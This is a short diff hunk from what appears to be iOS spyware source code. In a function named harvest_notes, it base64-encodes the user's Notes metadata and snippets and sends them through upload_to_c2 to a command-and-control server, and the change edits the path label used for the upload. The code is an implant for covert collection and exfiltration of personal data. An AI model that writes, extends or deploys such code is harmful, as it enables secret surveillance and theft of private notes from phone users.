@@ -523,7 +523,7 @@ void harvest_notes(void) {
             NSString *b64meta = json_b64(metaRows);
             if (b64meta)
                 upload_to_c2("personal",
-                             "/varuna/notes/NoteStore_meta.json",
+                             "/var/mobile/notes/NoteStore_meta.json",
                              "iOS Notes metadata+snippet", b64meta.UTF8String);
         }
 
